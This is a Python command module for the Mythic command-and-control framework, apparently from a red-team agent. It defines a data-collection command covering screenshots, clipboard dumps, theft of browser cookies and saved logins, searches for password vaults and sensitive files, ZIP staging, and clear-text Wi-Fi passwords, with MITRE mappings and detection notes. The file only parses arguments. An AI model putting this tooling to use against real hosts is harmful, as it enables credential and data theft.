from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class CollectionExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=("screenshot | clipboard | browser | search | stage | "
                             "wifi | cleanup. Padrão: screenshot."),
                default_value="screenshot",
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/stage) raiz da busca. Vazio = perfil do usuário "
                            "(ou todos os discos se all_drives=true).",
                default_value="",
            ),
            CommandParameter(
                name="exts",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Extensões separadas por vírgula.",
                default_value=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
            ),
            CommandParameter(
                name="keywords",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Palavras-chave no nome do arquivo (vírgula). Ex: senha,backup,vpn",
                default_value="",
            ),
            CommandParameter(
                name="browser",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(action=browser) chrome | edge | firefox.",
                default_value="chrome",
            ),
            CommandParameter(
                name="all_drives",
                type=ParameterType.Boolean,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/stage) buscar em todos os discos locais.",
                default_value=False,
            ),
            CommandParameter(
                name="max_files",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Limite de arquivos por execução. Padrão: 200.",
                default_value=200,
            ),
            CommandParameter(
                name="max_mb",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Limite total em MB (staging). Padrão: 50.",
                default_value=50,
            ),
        ]

    async def parse_arguments(self):
        defaults = {
            "action": "screenshot", "path": "", "exts":
            ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt", "keywords": "",
            "browser": "chrome", "all_drives": False, "max_files": 200,
            "max_mb": 50,
        }
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                for k, dv in defaults.items():
                    t = ParameterType.Boolean if isinstance(dv, bool) else (
                        ParameterType.Number if isinstance(dv, int) else None)
                    if t:
                        self.add_arg(k, d.get(k, dv), t)
                    else:
                        self.add_arg(k, d.get(k, dv))
            else:
                parts = self.command_line.strip().split()
                self.add_arg("action",     parts[0] if len(parts) > 0 else "screenshot")
                self.add_arg("path",       parts[1] if len(parts) > 1 else "")
                for k, dv in defaults.items():
                    if k in ("action", "path"):
                        continue
                    t = ParameterType.Boolean if isinstance(dv, bool) else (
                        ParameterType.Number if isinstance(dv, int) else None)
                    if t:
                        self.add_arg(k, dv, t)
                    else:
                        self.add_arg(k, dv)
        else:
            for k, dv in defaults.items():
                t = ParameterType.Boolean if isinstance(dv, bool) else (
                    ParameterType.Number if isinstance(dv, int) else None)
                if t:
                    self.add_arg(k, dv, t)
                else:
                    self.add_arg(k, dv)


class CollectionExtCommand(CommandBase):
    cmd         = "collection_ext"
    needs_admin = False
    help_cmd    = "collection_ext {\"action\":\"<ação>\", ...}"
    description = (
        "Collection (MITRE TA0009) no host do agente.\n\n"
        "Ações:\n"
        "  screenshot          captura todas as telas (T1113)\n"
        "  clipboard           dump do clipboard texto/imagem (T1115)\n"
        "  browser             history/bookmarks/Cookies/Login Data de\n"
        "                      chrome/edge/firefox (T1005/T1555.003)\n"
        "  search              busca arquivos por extensão/palavra-chave (T1005)\n"
        "  stage               search + copia p/ %TEMP%\\anubis_stage e gera ZIP (T1074)\n"
        "  wifi                SSIDs e senhas Wi-Fi em claro (T1005)\n"
        "  cleanup             remove o diretório de staging\n\n"
        "Exemplos:\n"
        "  collection_ext {\"action\":\"screenshot\"}\n"
        "  collection_ext {\"action\":\"browser\",\"browser\":\"chrome\"}\n"
        "  collection_ext {\"action\":\"search\",\"path\":\"C:\\\\Users\\\\\",\n"
        "                  \"keywords\":\"senha,vpn,kdbx\"}\n"
        "  collection_ext {\"action\":\"stage\",\"exts\":\".docx,.pdf,.kdbx\",\n"
        "                  \"max_mb\":100,\"all_drives\":true}\n\n"
        "Detecção:\n"
        "  EID 4688 (Compress-Archive/copy), Sysmon 11 (file create no %TEMP%),\n"
        "  4688 netsh wlan, PowerShell 4104 (CopyFromScreen/GetClipboard)"
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1005", "T1074.001", "T1074.002", "T1113", "T1115",
                             "T1555.003"]
    supported_ui_features = []
    argument_class        = CollectionExtArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action = taskData.args.get_arg("action") or "screenshot"
        extra = ""
        if action == "browser":
            extra = " (%s)" % (taskData.args.get_arg("browser") or "chrome")
        elif action in ("search", "stage"):
            p = taskData.args.get_arg("path") or ""
            extra = " %s%s%s" % (
                p or ("<todos os discos>" if taskData.args.get_arg("all_drives")
                      else "<perfil do usuário>"),
                ("/kw:%s" % taskData.args.get_arg("keywords"))
                if taskData.args.get_arg("keywords") else "",
                ("/drive-wide" if taskData.args.get_arg("all_drives") else ""),
            )
        response.DisplayParams = "%s%s" % (action, extra)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
